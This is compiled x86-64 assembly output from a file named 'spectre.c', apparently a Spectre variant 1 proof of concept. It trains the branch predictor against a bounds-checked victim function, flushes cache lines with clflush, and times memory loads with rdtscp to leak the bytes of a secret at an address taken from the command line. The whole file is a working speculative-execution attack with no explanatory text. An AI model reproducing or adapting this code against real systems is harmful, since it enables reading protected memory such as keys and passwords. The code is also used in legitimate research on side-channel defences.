	.file	"spectre.c"
	.text
	.p2align 4
	.globl	check
	.type	check, @function
check:
.LFB5689:
	.cfi_startproc
	endbr64
	movslq	array1_size(%rip), %rax
	cmpq	%rdi, %rax
	seta	%al
	movzbl	%al, %eax
	ret
	.cfi_endproc
.LFE5689:
	.size	check, .-check
	.p2align 4
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB5690:
	.cfi_startproc
	movslq	array1_size(%rip), %rax
	cmpq	%rdi, %rax
	jbe	.L3
	subl	$1, %edi
	js	.L3
	movzbl	temp(%rip), %ecx
	movslq	%edi, %rdx
	leaq	array1(%rip), %rsi
	leaq	array2(%rip), %rdi
	.p2align 4,,10
	.p2align 3
.L5:
	movzbl	(%rsi,%rdx), %eax
	subq	$1, %rdx
	sall	$9, %eax
	cltq
	andb	(%rdi,%rax), %cl
	testl	%edx, %edx
	jns	.L5
	movb	%cl, temp(%rip)
.L3:
	ret
	.cfi_endproc
.LFE5690:
	.size	victim_function, .-victim_function
	.p2align 4
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB5691:
	.cfi_startproc
	endbr64
	pushq	%r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	leaq	results(%rip), %r15
	movl	$128, %ecx
	leaq	array2(%rip), %r11
	pushq	%r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	movl	$999, %r9d
	leaq	131072(%r11), %r10
	pushq	%r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	movl	$2863311531, %r13d
	pushq	%r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	pushq	%rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	pushq	%rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	leaq	array1(%rip), %rbx
	subq	$40, %rsp
	.cfi_def_cfa_offset 96
	movq	%rdi, 8(%rsp)
	movq	%r15, %rdi
	leaq	16(%rsp), %r8
	movq	%fs:40, %rax
	movq	%rax, 24(%rsp)
	xorl	%eax, %eax
	movl	$0, 16(%rsp)
	rep stosq
.L8:
	leaq	array2(%rip), %rax
	.p2align 4,,10
	.p2align 3
.L9:
	clflush	(%rax)
	addq	$512, %rax
	cmpq	%rax, %r10
	jne	.L9
	movl	%r9d, %eax
	movl	array1_size(%rip), %ecx
	movq	8(%rsp), %r12
	movl	$29, %r14d
	cltd
	idivl	%ecx
	movslq	%edx, %rbp
	xorq	%rbp, %r12
	.p2align 4,,10
	.p2align 3
.L11:
	clflush	array1_size(%rip)
	movl	$0, 20(%rsp)
	movl	20(%rsp), %eax
	cmpl	$99, %eax
	jg	.L13
	.p2align 4,,10
	.p2align 3
.L10:
	movl	20(%rsp), %eax
	addl	$1, %eax
	movl	%eax, 20(%rsp)
	movl	20(%rsp), %eax
	cmpl	$99, %eax
	jle	.L10
.L13:
	movl	%r14d, %eax
	imulq	%r13, %rax
	shrq	$34, %rax
	leal	(%rax,%rax,2), %ecx
	movl	%r14d, %eax
	addl	%ecx, %ecx
	subl	%ecx, %eax
	subl	$1, %eax
	xorw	%ax, %ax
	cltq
	movq	%rax, %rdi
	shrq	$16, %rdi
	orq	%rax, %rdi
	andq	%r12, %rdi
	xorq	%rbp, %rdi
	call	victim_function
	subl	$1, %r14d
	jnb	.L11
	movl	$13, %esi
	.p2align 4,,10
	.p2align 3
.L12:
	movzbl	%sil, %ebp
	movl	%ebp, %r12d
	sall	$9, %r12d
	rdtscp
	movq	%rax, %rdi
	salq	$32, %rdx
	movslq	%r12d, %r12
	movl	%ecx, (%r8)
	orq	%rdx, %rdi
	movzbl	(%r11,%r12), %eax
	rdtscp
	salq	$32, %rdx
	movl	%ecx, (%r8)
	orq	%rdx, %rax
	subq	%rdi, %rax
	cmpq	$50, %rax
	ja	.L14
	movl	%r9d, %eax
	movl	array1_size(%rip), %ecx
	cltd
	idivl	%ecx
	movslq	%edx, %rdx
	movzbl	(%rbx,%rdx), %eax
	cmpl	%ebp, %eax
	je	.L14
	addl	$1, (%r15,%rbp,4)
.L14:
	addl	$167, %esi
	cmpl	$42765, %esi
	jne	.L12
	subl	$1, %r9d
	jne	.L8
	movl	results(%rip), %eax
	xorl	16(%rsp), %eax
	movl	%eax, results(%rip)
	movq	24(%rsp), %rax
	subq	%fs:40, %rax
	jne	.L23
	addq	$40, %rsp
	.cfi_remember_state
	.cfi_def_cfa_offset 56
	popq	%rbx
	.cfi_def_cfa_offset 48
	popq	%rbp
	.cfi_def_cfa_offset 40
	popq	%r12
	.cfi_def_cfa_offset 32
	popq	%r13
	.cfi_def_cfa_offset 24
	popq	%r14
	.cfi_def_cfa_offset 16
	popq	%r15
	.cfi_def_cfa_offset 8
	ret
.L23:
	.cfi_restore_state
	call	__stack_chk_fail@PLT
	.cfi_endproc
.LFE5691:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata.str1.8,"aMS",@progbits,1
	.align 8
.LC0:
	.string	"Putting '%s' in memory, address %p\n"
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC1:
	.string	"%p"
.LC2:
	.string	"%d"
	.section	.rodata.str1.8
	.align 8
.LC3:
	.string	"Trying malicious_x = %p, len = %d\n"
	.section	.rodata.str1.1
.LC4:
	.string	"Reading %d bytes:\n"
	.section	.rodata.str1.8
	.align 8
.LC5:
	.string	"Reading at malicious_x = %p secc= %c sec_ascii=%d ...\n"
	.section	.rodata.str1.1
.LC6:
	.string	"result[%d]=%d "
.LC7:
	.string	"\n"
.LC8:
	.string	"addr = %llx, pid = %d\n"
	.section	.text.startup,"ax",@progbits
	.p2align 4
	.globl	main
	.type	main, @function
main:
.LFB5692:
	.cfi_startproc
	endbr64
	pushq	%r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	pushq	%r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	pushq	%r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	pushq	%r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	pushq	%rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	pushq	%rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	leaq	.LC6(%rip), %rbx
	subq	$88, %rsp
	.cfi_def_cfa_offset 144
	movl	%edi, 20(%rsp)
	movq	%rsi, 24(%rsp)
	movq	%fs:40, %rax
	movq	%rax, 72(%rsp)
	xorl	%eax, %eax
.L25:
	movq	stdin(%rip), %rdi
	call	getc@PLT
	cmpb	$114, %al
	je	.L39
.L26:
	cmpb	$10, %al
	je	.L25
	cmpb	$105, %al
	jne	.L33
	xorl	%eax, %eax
	call	getpid@PLT
	movl	$1, %edi
	leaq	33+check(%rip), %rdx
	leaq	.LC8(%rip), %rsi
	movl	%eax, %ecx
	xorl	%eax, %eax
	call	__printf_chk@PLT
	movq	stdin(%rip), %rdi
	call	getc@PLT
	cmpb	$114, %al
	jne	.L26
.L39:
	movq	secret(%rip), %rdx
	leaq	.LC0(%rip), %rsi
	movl	$1, %edi
	xorl	%eax, %eax
	leaq	array1(%rip), %rbp
	movq	%rdx, %rcx
	call	__printf_chk@PLT
	movq	secret(%rip), %rdi
	movq	%rdi, %rax
	subq	%rbp, %rax
	movq	%rax, 48(%rsp)
	call	strlen@PLT
	movl	$131072, %edx
	movl	$1, %esi
	leaq	array2(%rip), %rdi
	movl	%eax, 44(%rsp)
	movl	%eax, %r12d
	call	memset@PLT
	cmpl	$3, 20(%rsp)
	je	.L40
.L27:
	xorl	%eax, %eax
	movl	%r12d, %edx
	movl	$1, %edi
	leaq	.LC4(%rip), %rsi
	call	__printf_chk@PLT
	subl	$1, 44(%rsp)
	js	.L25
	leaq	70(%rsp), %rax
	xorl	%ebp, %ebp
	leaq	60(%rsp), %r14
	movq	%rax, 8(%rsp)
	leaq	.LC5(%rip), %r15
.L28:
	movq	secret(%rip), %rax
	movq	48(%rsp), %rdx
	movq	%r15, %rsi
	movl	$1, %edi
	leaq	4+results(%rip), %r13
	movl	$1, %r12d
	movsbl	(%rax,%rbp), %ecx
	xorl	%eax, %eax
	movl	%ecx, %r8d
	call	__printf_chk@PLT
	movq	48(%rsp), %rdi
	movq	8(%rsp), %rsi
	movq	%r14, %rdx
	leaq	1(%rdi), %rax
	movq	%rax, 48(%rsp)
	call	readMemoryByte
	jmp	.L31
	.p2align 4,,10
	.p2align 3
.L30:
	addl	$1, %r12d
	addq	$4, %r13
	cmpl	$256, %r12d
	je	.L41
.L31:
	movl	-4(%r13), %ecx
	movl	0(%r13), %eax
	leal	-1(%r12), %edx
	cmpl	%eax, %ecx
	jle	.L30
	movl	%ecx, %esi
	subl	%eax, %esi
	cmpl	$100, %esi
	jle	.L30
	movq	%rbx, %rsi
	movl	$1, %edi
	xorl	%eax, %eax
	call	__printf_chk@PLT
	movl	0(%r13), %ecx
	movl	%r12d, %edx
	movq	%rbx, %rsi
	movl	$1, %edi
	xorl	%eax, %eax
	call	__printf_chk@PLT
	jmp	.L30
.L41:
	leaq	.LC7(%rip), %rsi
	movl	$1, %edi
	xorl	%eax, %eax
	addq	$1, %rbp
	call	__printf_chk@PLT
	movl	44(%rsp), %eax
	subl	$1, %eax
	movl	%eax, 44(%rsp)
	testl	%eax, %eax
	jns	.L28
	jmp	.L25
.L33:
	movq	72(%rsp), %rax
	subq	%fs:40, %rax
	jne	.L42
	addq	$88, %rsp
	.cfi_remember_state
	.cfi_def_cfa_offset 56
	xorl	%eax, %eax
	popq	%rbx
	.cfi_def_cfa_offset 48
	popq	%rbp
	.cfi_def_cfa_offset 40
	popq	%r12
	.cfi_def_cfa_offset 32
	popq	%r13
	.cfi_def_cfa_offset 24
	popq	%r14
	.cfi_def_cfa_offset 16
	popq	%r15
	.cfi_def_cfa_offset 8
	ret
.L40:
	.cfi_restore_state
	movq	24(%rsp), %r15
	leaq	48(%rsp), %rdx
	leaq	.LC1(%rip), %rsi
	xorl	%eax, %eax
	movq	8(%r15), %rdi
	call	__isoc99_sscanf@PLT
	movq	16(%r15), %rdi
	leaq	44(%rsp), %rdx
	xorl	%eax, %eax
	leaq	.LC2(%rip), %rsi
	subq	%rbp, 48(%rsp)
	call	__isoc99_sscanf@PLT
	movl	44(%rsp), %ecx
	movq	48(%rsp), %rdx
	xorl	%eax, %eax
	leaq	.LC3(%rip), %rsi
	movl	$1, %edi
	call	__printf_chk@PLT
	movl	44(%rsp), %r12d
	jmp	.L27
.L42:
	call	__stack_chk_fail@PLT
	.cfi_endproc
.LFE5692:
	.size	main, .-main
	.local	results
	.comm	results,1024,32